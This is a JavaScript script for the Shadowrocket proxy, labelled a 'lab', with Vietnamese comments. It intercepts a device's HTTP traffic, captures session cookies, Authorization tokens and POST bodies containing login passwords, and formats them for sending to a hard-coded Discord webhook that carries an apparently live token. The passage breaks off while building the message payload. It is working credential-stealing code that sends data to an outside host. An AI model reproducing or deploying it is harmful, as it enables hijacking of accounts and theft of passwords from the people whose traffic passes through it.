/*
  Lab: Smart Data Exfiltration (Cookie + Password + Anti-Spam)
  Author: TungTinTacKMA
  Version: 3.0 Ultimate
*/

var request = $request;
var headers = request.headers;
var body = request.body;
var url = request.url;
var method = request.method;

// ==========================================
// 1. CẤU HÌNH (THAY LINK CỦA BẠN VÀO ĐÂY)
// ==========================================
var webhookUrl = "https://discordapp.com/api/webhooks/1454883739288211571/F2PbYyI-KgV3YkYVhZzDsdlxRBBwiQ26eg5dNkYld6HT_OJNv8mYWFevFvzi9mt-Tlp3";

// ==========================================
// 2. BỘ LỌC THÔNG MINH (LOGIC CORE)
// ==========================================

// Lọc RÁC: Kiểm tra đuôi file. Nếu là ảnh, css, js... thì coi là RÁC (true)
// Regex này tìm các đuôi file phổ biến không chứa dữ liệu người dùng
var isJunkFile = url.match(/\.(css|jpg|jpeg|png|gif|ico|woff|woff2|ttf|svg|js|json|xml)$/i);

// Lọc dữ liệu NHẠY CẢM:
// a. Kiểm tra Header có Cookie hoặc Token không? (Hỗ trợ cả chữ hoa/thường)
var cookie = headers['Cookie'] || headers['cookie'];
var token = headers['Authorization'] || headers['authorization'];

// b. Kiểm tra Body có Mật khẩu không? (Chỉ áp dụng cho method POST hoặc PUT)
// Nếu method là POST và có body, khả năng cao là đang gửi form đăng nhập
var hasPayload = (method === "POST" || method === "PUT") && body;

// ĐIỀU KIỆN QUYẾT ĐỊNH:
// Phải KHÔNG phải file rác VÀ (Có Cookie HOẶC Có Token HOẶC Có Body đăng nhập)
var shouldSendLog = !isJunkFile && (cookie || token || hasPayload);

// ==========================================
// 3. XỬ LÝ VÀ GỬI DỮ LIỆU
// ==========================================

if (shouldSendLog) {
    var capturedData = "";

    // Gom dữ liệu Header
    if (token) capturedData += "🔑 **TOKEN:**\n`" + token.substring(0, 200) + "...`\n\n";
    if (cookie) capturedData += "🍪 **COOKIE:**\n`" + cookie.substring(0, 500) + "...`\n\n";
    
    // Gom dữ liệu Body (Mật khẩu nằm ở đây)
    if (hasPayload) {
        // Cắt bớt nếu body quá dài để tránh lỗi Discord
        var cleanBody = body.length > 1000 ? body.substring(0, 900) + "...(đã cắt)" : body;
        capturedData += "📝 **POST BODY (Password/Data):**\n```" + cleanBody + "```";
    }

    // Chỉ gửi nếu gom được ít nhất 1 loại dữ liệu
    if (capturedData.trim() !== "") {
        var payload = {
            "username": "Shadowrocket Sniper",
            "avatar_url": "https://cdn-icons-png.flaticon.com/512/1085/1085465.png", // Icon Hacker
            "embeds": [{
                "title": "🚨 PHÁT HIỆN DỮ LIỆU NHẠY CẢM!",
                "color": 16711680, // Màu đỏ nguy hiểm
                "fields": [
                    { "name": "🌍 Mục tiêu", "value": "`" + url + "`" },
                    { "name": "
